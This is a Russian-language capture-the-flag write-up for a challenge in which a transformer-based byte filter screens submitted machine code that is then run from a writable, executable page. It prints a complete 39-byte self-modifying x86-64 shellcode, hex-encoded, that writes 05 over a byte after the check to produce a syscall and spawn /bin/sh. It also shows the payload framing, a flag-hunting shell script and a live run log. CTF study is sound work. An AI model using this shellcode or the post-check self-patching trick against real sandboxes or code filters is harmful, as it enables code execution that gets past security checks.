# filter: побайтовый фильтр перед записываемым кодом

[English](solve.md)

## 0. Что дано

Сервис принимает машинный код и решает, запускать ли его. Решение принимает небольшая трансформерная модель: она оценивает отправленные байты, и всё, что получило положительную оценку, отклоняется.

В раздаче есть раннер (`filter.c`), веса модели (`model.h`), генератор, который эти веса построил (`gen_model.py`), и Makefile.

План следовал прямо из этих файлов:

1. Взять из раннера точный формат входа.
2. Понять, что модель на самом деле распознаёт, по генератору, а не по весам.
3. Собрать байты, безобидные для модели и становящиеся syscall после проверки.
4. Проверить локально, затем отправить на инстанс и прочитать флаг.

## 1. Формат входа

`filter.c` читает 4-байтовую little-endian длину, отклоняет ноль и всё больше `0x1000`, отображает страницу с `PROT_READ | PROT_WRITE | PROT_EXEC`, читает ровно столько байт, затем гоняет guard и вызывает буфер.

```c
unsigned int len = 0;
if (read_n(0, &len, 4) != 4) return 1;
if (len == 0 || len > MAX_LEN) return 1;
unsigned char *code = mmap(NULL, MAX_LEN, PROT_READ | PROT_WRITE | PROT_EXEC, ...);
if (read_n(0, code, len) != (ssize_t)len) return 1;
```

Здесь важны две вещи. Кадр двоичный, а не текстовый, то есть payload это префикс длины плюс сырые байты. И отображение остаётся записываемым, пока исполняемое, а это и есть настоящая уязвимость; на её фоне нейросеть это декорация.

Зачем этот шаг: записываемое и исполняемое отображение делает возможной самоперезапись, и никакая классификация этого не переживёт.

## 2. Что модель действительно ловит

`gen_model.py` строит веса аналитически, и там же есть эталонная проверка: сеть сравнивается с оракулом, который ищет три пары байт.

- `0f 05` это `syscall` на x86-64
- `cd 80` это `int 0x80`
- `0f 34` это `sysenter`

Архитектура из `filter.c` (эмбеддинги токенов, причинное самовнимание, ReLU-слой, max pooling) вычисляет ровно этот тест на биграммы и ничего больше. Это таблица поиска в костюме трансформера.

Следствие практическое: payload проходит, если в нём нет ни одной из этих пар. Больше о коде ничего не проверяется, поэтому смысл инструкций для оценки не важен.

Зачем этот шаг: когда модель оказывается тестом на биграммы, задача перестаёт быть «обмануть нейросеть» и становится «не иметь этих двух байт рядом».

## 3. Зазор между проверкой и использованием

Раннер считает `guard_score(code, len)`, печатает вердикт и только потом вызывает буфер. Байты просматриваются один раз, до исполнения, и буфер никогда не становится только для чтения.

Значит payload может переписать себя. В отправке лежит `0f 04` (недействительный опкод) и одна инструкция, которая меняет следующий байт на `05` непосредственно перед тем, как до него дойдёт процессор; в момент исполнения пара становится `0f 05`, то есть настоящим syscall.

Payload на 39 байт:

```python
SHELLCODE = bytes.fromhex(
    "31c050488d3d15000000574889e631d2b03b488d1d04000000c603050f04c32f62696e2f736800"
)
```

Смещения, которые стоит проверять:

- `0x1c` содержит `0f 04`, этого guard не знает
- `0x1d` это байт, который перезаписывается на `05`
- после записи `0x1c` и `0x1d` читаются как `0f 05`

Регистры выставляются обычно: `rax = 59`, `rdi` указывает на `/bin/sh`, `rsi` на `["/bin/sh", NULL]`, `rdx = 0`.

Зачем этот шаг: классификатор видит одну строку байт, а процессор исполняет другую; эта разница и есть эксплойт.

## 4. Как отправить

Кадр это `struct.pack("<I", len(payload)) + payload`, за ним скрипт, который унаследует тот же stdin и stdout после `execve`. Скрипт печатает маркер и ищет флаг в обычных местах:

```sh
echo FILTER_SHELL_OK
id
pwd
ls -la
for f in /flag /flag.txt ./flag ./flag.txt /app/flag /app/flag.txt; do
  if [ -f "$f" ]; then echo "[+] FLAG CANDIDATE: $f"; cat "$f"; fi
done
```

`FILTER_SHELL_OK` это наш собственный маркер, а не флаг; он подтверждает только то, что шелл жив.

Зачем этот шаг: `execve` заменяет процесс, поэтому всё, что уже лежит в сокете, становится вводом шелла, и второй round trip не нужен.

## 5. Прогон на инстансе

Инстанс публикуется за TCP-гейтвеем на порту 1337. Гейтвей печатает `Please, enter token:` и ждёт тикет инстанса строкой, после чего пропускает к задаче; версия скрипта в этом райтапе умеет и прямое подключение без тикета.

```bash
python3 scripts/solve_filter_remote.py --ticket '<тикет-инстанса>'
```

Записанный прогон 2 ноября 2026 года на живом инстансе:

```text
[*] Please, enter token:
> [client] Sending instance ticket
[+] Connecting...
=== filter: neural shellcode firewall ===
Optimus Prime reporting for duty.
Our transformer has read every exploit on the internet.
It will happily run code it believes is harmless.
Send your shellcode as: [4-byte little-endian length][bytes], max 4096.
[*] guard verdict: score = -10.000
[+] looks harmless to me. Executing...
FILTER_SHELL_OK
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
/app
-rwxr-xr-x 1 root root 236   entrypoint.sh
-rwxr-xr-x 1 root root 24920 filter
[+] FLAG CANDIDATE: /flag.txt
```

Флаг был прочитан из `/flag.txt`, в репозитории он скрыт как `ctfcup{...}`. Оценка `-10.000` это модель говорит «безобидно», и в этом весь смысл: байты, которые она оценивала, не те, что исполнились.

Зачем этот шаг: удалённый прогон это единственное доказательство, что шеллкод работает вне локальной сборки, и он же показывает, по какому пути в деплое лежит флаг.

## 6. Тупики

- Отправить литеральный `syscall`: отклоняется, пара есть в payload.
- Паддинг и перестановка инструкций: запрещённая пара всё равно где-то рядом, а guard смотрит именно на соседство.
- Атаковать арифметику модели: не нужно, генератор документирует, что сеть вычисляет, а раннер открывает куда более простой зазор.
- Переписывать более позднюю инструкцию между guard и `execve`: сложнее, потому что патчащая инструкция должна выполниться первой; патч syscall на месте это кратчайший путь.

## 7. Выводы

- Классификатор, который запускается один раз до исполнения, по памяти, остающейся записываемой, не может гарантировать ничего о том, что исполнится.
- Читать генератор, а не только веса: «нейросетевая» проверка оказалась списком из трёх биграмм.
- Записываемые и исполняемые отображения превращают любой предварительный просмотр байт в формальность.

Одним абзацем: раннер отображает присланный шеллкод как записываемый и исполняемый и один раз оценивает его трансформером, который, по своему же генератору, отбраковывает только пары `0f 05`, `cd 80` и `0f 34`; payload на 39 байт несёт `0f 04` и одну инструкцию, переписывающую следующий байт в `05` до исполнения, поэтому guard ставит «безобидно», а процессор выполняет настоящий `execve("/bin/sh")`, который читает флаг из `/flag.txt`.
